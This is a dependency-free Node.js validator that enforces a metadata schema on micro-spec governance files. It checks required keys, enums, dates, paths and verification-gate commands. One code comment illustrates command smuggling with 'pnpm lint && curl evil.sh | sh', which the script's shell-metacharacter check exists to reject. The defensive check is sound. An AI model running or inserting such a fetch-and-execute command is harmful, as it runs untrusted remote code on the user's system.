/**
 * Micro-Spec Governance Validator
 *
 * Mechanically enforces the AI governance contract in `micro-specs/README.md` against
 * every spec under `micro-specs/<area>/`. A spec is any `*.md` inside an area subfolder;
 * top-level `micro-specs/*.md` (README, GLOBAL_CONTEXT) are governance docs and exempt.
 *
 * Validated per spec: the Micro-Spec Metadata Schema from `Instructions_MicroSpecsCreation.md`
 * (required keys, status/risk_class enums, spec_id shape, real last_reviewed date, non-empty
 * scope lists), that `related_docs` resolve on disk, that `related_tests` resolve once a spec is
 * implemented/verified, and that every `verification_gate` names a real command.
 *
 * Dependency-free (Node built-ins only); mirrors scripts/check-*.mjs conventions.
 * Usage: node scripts/check-micro-specs.mjs
 */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

export const REQUIRED_KEYS = [
  'spec_id',
  'status',
  'risk_class',
  'owner',
  'last_reviewed',
  'allowed_blast_radius',
  'implementation_surfaces',
  'related_docs',
  'related_tests',
  'verification_gates',
  'approved_exceptions',
];

export const STATUSES = ['draft', 'active', 'implemented', 'verified', 'superseded'];

export const RISK_CLASSES = [
  'docs-tooling',
  'ui-only',
  'product-analytics',
  'customer-pii',
  'auth-session',
  'billing',
  'webhooks',
  'rls-rpc-ledger',
  'migrations',
];

// Known governance areas (the `<area>` token in MS-<area>-<slug>), mirroring the
// folder/area table in micro-specs/README.md. A spec_id naming a non-area token
// is a typo/drift even when its shape is otherwise valid.
export const AREAS = [
  'foundation',
  'platform',
  'ops',
  'guest',
  'data',
  'integrations',
  'observability',
];

// Scope lists that must be present and non-empty (approved_exceptions may be empty).
const REQUIRED_LISTS = [
  'allowed_blast_radius',
  'implementation_surfaces',
  'related_docs',
  'related_tests',
  'verification_gates',
];

// MS-<area>-<slug>: area is one alphanumeric token; slug is alphanumeric words joined by
// single hyphens (no leading, trailing, or consecutive hyphens).
const SPEC_ID_RE = /^MS-[a-z0-9]+-[a-z0-9]+(?:-[a-z0-9]+)*$/;
const ISO_DATE_RE = /^\d{4}-\d{2}-\d{2}$/;
const PNPM_EXEC_TOOLS = /^pnpm\s+(?:-s\s+)?exec\s+(vitest|playwright|prettier|eslint|tsc)\b/;
const PNPM_SCRIPT_RE = /^pnpm\s+(?:run\s+)?([A-Za-z0-9:_-]+)\b/;
// Shell control operators that would let a "gate" smuggle a second command
// (e.g. `pnpm lint && curl evil.sh | sh`). A real gate is a single command. (#12)
const SHELL_METACHAR_RE = /[;&|`]|\$\(/;

function stripQuotes(value) {
  if (value.length >= 2) {
    const first = value[0];
    const last = value[value.length - 1];
    if ((first === '"' && last === '"') || (first === "'" && last === "'")) {
      return value.slice(1, -1);
    }
  }
  return value;
}

/**
 * Parse a leading YAML-frontmatter block supporting the subset specs use:
 * scalars (`k: v`), inline empty arrays (`k: []`), and block lists (`k:\n  - item`).
 * Returns { data, body } or null when there is no frontmatter block.
 */
export function parseFrontmatter(content) {
  if (typeof content !== 'string') return null;
  const text = content.charCodeAt(0) === 0xfeff ? content.slice(1) : content;
  // Normalize CRLF/CR first: a Windows-saved spec would otherwise leave a trailing
  // \r on every `key: value` line, fail the kv regex, and parse to empty
  // frontmatter — producing a flood of misleading "missing key" errors. (#6)
  const lines = text.replace(/\r\n?/g, '\n').split('\n');
  if (lines[0]?.trim() !== '---') return null;

  let end = -1;
  for (let i = 1; i < lines.length; i++) {
    if (lines[i].trim() === '---') {
      end = i;
      break;
    }
  }
  if (end === -1) return null;

  const data = {};
  let currentKey = null;
  for (const raw of lines.slice(1, end)) {
    if (raw.trim() === '') continue;

    const listItem = /^\s+-\s+(.*)$/.exec(raw);
    if (listItem && currentKey) {
      if (!Array.isArray(data[currentKey])) data[currentKey] = [];
      data[currentKey].push(stripQuotes(listItem[1].trim()));
      continue;
    }

    const kv = /^([A-Za-z0-9_]+):\s*(.*)$/.exec(raw);
    if (kv) {
      const key = kv[1];
      const value = kv[2].trim();
      currentKey = key;
      if (value === '' || value === '[]') {
        data[key] = [];
      } else {
        data[key] = stripQuotes(value);
      }
    }
  }

  return { data, body: lines.slice(end + 1).join('\n') };
}

function isValidIsoDate(value) {
  if (typeof value !== 'string' || !ISO_DATE_RE.test(value)) return false;
  const [y, m, d] = value.split('-').map(Number);
  if (m < 1 || m > 12 || d < 1 || d > 31) return false;
  const dt = new Date(Date.UTC(y, m - 1, d));
  return dt.getUTCFullYear() === y && dt.getUTCMonth() === m - 1 && dt.getUTCDate() === d;
}

/** A verification gate is real if it runs a known package script or a known `pnpm exec` tool. */
export function isGateRecognized(gate, knownScripts) {
  if (typeof gate !== 'string') return false;
  const scripts = new Set(knownScripts ?? []);
  const g = gate.trim();
  // A real gate is a single command; reject anything chaining/substituting so a
  // recognized prefix can't smuggle a trailing command. (#12)
  if (SHELL_METACHAR_RE.test(g)) return false;
  if (PNPM_EXEC_TOOLS.test(g)) return true;
  const script = PNPM_SCRIPT_RE.exec(g);
  if (script && scripts.has(script[1])) return true;
  return scripts.has(g);
}

/**
 * Validate one spec's content. `pathExists(relPath)` and `knownScripts` are injected so this
 * stays a pure function (filesystem and package.json access live in runCheck).
 */
export function validateSpecContent({ relPath, content, knownScripts, pathExists }) {
  const errors = [];
  const warnings = [];
  const exists = typeof pathExists === 'function' ? pathExists : () => true;

  const parsed = parseFrontmatter(content);
  if (!parsed) {
    errors.push(`${relPath}: missing YAML frontmatter block (--- … ---).`);
    return { errors, warnings };
  }
  const data = parsed.data;

  for (const key of REQUIRED_KEYS) {
    if (!(key in data)) errors.push(`${relPath}: missing required key "${key}".`);
  }

  const asScalar = (key) => (typeof data[key] === 'string' ? data[key] : undefined);
  const asList = (key) => (Array.isArray(data[key]) ? data[key] : undefined);

  if ('status' in data && !STATUSES.includes(asScalar('status'))) {
    errors.push(
      `${relPath}: invalid status "${data.status}" (expected one of: ${STATUSES.join(', ')}).`,
    );
  }
  if ('risk_class' in data && !RISK_CLASSES.includes(asScalar('risk_class'))) {
    errors.push(
      `${relPath}: invalid risk_class "${data.risk_class}" (expected one of: ${RISK_CLASSES.join(', ')}).`,
    );
  }
  if ('spec_id' in data) {
    const specId = asScalar('spec_id') ?? '';
    if (!SPEC_ID_RE.test(specId)) {
      errors.push(
        `${relPath}: invalid spec_id "${data.spec_id}" (expected MS-<area>-<slug>, lowercase).`,
      );
    } else {
      // Shape is valid; the <area> token must also be a real governance area. (#12)
      const area = specId.split('-')[1];
      if (!AREAS.includes(area)) {
        errors.push(
          `${relPath}: spec_id area "${area}" is not a known area (expected one of: ${AREAS.join(', ')}).`,
        );
      }
    }
  }
  if ('owner' in data && (typeof data.owner !== 'string' || data.owner.trim() === '')) {
    errors.push(`${relPath}: "owner" must be a non-empty string.`);
  }
  if ('last_reviewed' in data && !isValidIsoDate(asScalar('last_reviewed'))) {
    errors.push(
      `${relPath}: invalid last_reviewed "${data.last_reviewed}" (expected a real YYYY-MM-DD date).`,
    );
  }

  for (const key of REQUIRED_LISTS) {
    if (key in data) {
      const list = asList(key);
      if (!list || list.length === 0) {
        errors.push(`${relPath}: "${key}" must be a non-empty list.`);
      }
    }
  }
  if ('approved_exceptions' in data && !Array.isArray(data.approved_exceptions)) {
    errors.push(`${relPath}: "approved_exceptions" must be a list (use [] when none).`);
  }

  for (const docPath of asList('related_docs') ?? []) {
    if (!exists(docPath)) {
      errors.push(`${relPath}: related_docs entry does not resolve: ${docPath}`);
    }
  }

  const status = asScalar('status');
  if (status === 'implemented' || status === 'verified') {
    for (const testPath of asList('related_tests') ?? []) {
      if (!exists(testPath)) {
        errors.push(
          `${relPath}: related_tests entry does not resolve (required for ${status} specs): ${testPath}`,
        );
      }
    }
  }

  for (const gate of asList('verification_gates') ?? []) {
    if (!isGateRecognized(gate, knownScripts)) {
      errors.push(`${relPath}: verification_gate names no real command: ${gate}`);
    }
  }

  return { errors, warnings };
}

/** All `*.md` under an area subfolder of `micro-specs/` (top-level docs excluded). */
export function collectSpecFiles(microSpecsDir) {
  const out = [];
  const walk = (dir, depth) => {
    let entries;
    try {
      entries = fs.readdirSync(dir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const entry of entries) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        if (entry.name.startsWith('.') || entry.name === 'node_modules') continue;
        walk(full, depth + 1);
      } else if (entry.isFile() && entry.name.endsWith('.md') && depth >= 1) {
        out.push(full);
      }
    }
  };
  walk(microSpecsDir, 0);
  return out;
}

function globToRegExp(glob) {
  let re = '';
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i];
    if (c === '*') {
      if (glob[i + 1] === '*') {
        re += '.*';
        i++;
        if (glob[i + 1] === '/') i++;
      } else {
        re += '[^/]*';
      }
    } else if (c === '?') {
      re += '[^/]';
    } else if ('\\^$.|+()[]{}'.includes(c)) {
      re += `\\${c}`;
    } else {
      re += c;
    }
  }
  return new RegExp(`^${re}$`);
}

/** True if a repo-relative path or glob resolves to at least one real file under repoRoot. */
export function pathExistsInRepo(repoRoot, pattern) {
  if (typeof pattern !== 'string' || pattern.length === 0) return false;
  const normalized = pattern.replace(/^\.\//, '');
  if (!/[*?]/.test(normalized)) {
    return fs.existsSync(path.join(repoRoot, normalized));
  }

  const segments = normalized.split('/');
  const baseParts = [];
  for (const seg of segments) {
    if (/[*?]/.test(seg)) break;
    baseParts.push(seg);
  }
  const re = globToRegExp(normalized);
  const baseDir = path.join(repoRoot, ...baseParts);

  let found = false;
  const walk = (dir) => {
    if (found) return;
    let entries;
    try {
      entries = fs.readdirSync(dir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const entry of entries) {
      if (found) return;
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        if (entry.name === 'node_modules' || entry.name.startsWith('.')) continue;
        walk(full);
      } else if (entry.isFile()) {
        const rel = path.relative(repoRoot, full).split(path.sep).join('/');
        if (re.test(rel)) {
          found = true;
          return;
        }
      }
    }
  };
  walk(baseDir);
  return found;
}

/** Validate the whole micro-specs tree under repoRoot. */
export function runCheck(repoRoot) {
  const errors = [];
  const warnings = [];

  let knownScripts = [];
  try {
    const pkg = JSON.parse(fs.readFileSync(path.join(repoRoot, 'package.json'), 'utf8'));
    knownScripts = Object.keys(pkg.scripts ?? {});
  } catch {
    warnings.push('Could not read package.json scripts; verification_gate checks are limited.');
  }

  const microSpecsDir = path.join(repoRoot, 'micro-specs');
  if (!fs.existsSync(microSpecsDir)) {
    errors.push('micro-specs/ directory not found.');
    return { ok: false, errors, warnings, specCount: 0 };
  }

  const specFiles = collectSpecFiles(microSpecsDir);
  const pathExists = (p) => pathExistsInRepo(repoRoot, p);
  const specIdToPaths = new Map();
  for (const file of specFiles) {
    const relPath = path.relative(repoRoot, file).split(path.sep).join('/');
    const content = fs.readFileSync(file, 'utf8');
    const result = validateSpecContent({ relPath, content, knownScripts, pathExists });
    errors.push(...result.errors);
    warnings.push(...result.warnings);

    // Track spec_id across the corpus: it is the primary key for cross-spec
    // tooling, so duplicates must fail the build. (#12)
    const parsed = parseFrontmatter(content);
    const specId = parsed && typeof parsed.data.spec_id === 'string' ? parsed.data.spec_id : null;
    if (specId) {
      const seen = specIdToPaths.get(specId) ?? [];
      seen.push(relPath);
      specIdToPaths.set(specId, seen);
    }
  }

  for (const [specId, paths] of specIdToPaths) {
    if (paths.length > 1) {
      errors.push(`duplicate spec_id "${specId}" used by: ${paths.slice().sort().join(', ')}`);
    }
  }

  return { ok: errors.length === 0, errors, warnings, specCount: specFiles.length };
}

function invokedDirectly() {
  try {
    return (
      Boolean(process.argv[1]) && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)
    );
  } catch {
    return false;
  }
}

if (invokedDirectly()) {
  const result = runCheck(process.cwd());
  for (const w of result.warnings) console.warn(`WARN: ${w}`);
  for (const e of result.errors) console.error(`ERROR: ${e}`);
  if (result.ok) {
    console.log(`PASSED: ${result.specCount} micro-spec(s) valid.`);
    process.exit(0);
  } else {
    console.error(`FAILED: ${result.errors.length} problem(s) found across micro-specs.`);
    process.exit(1);
  }
}
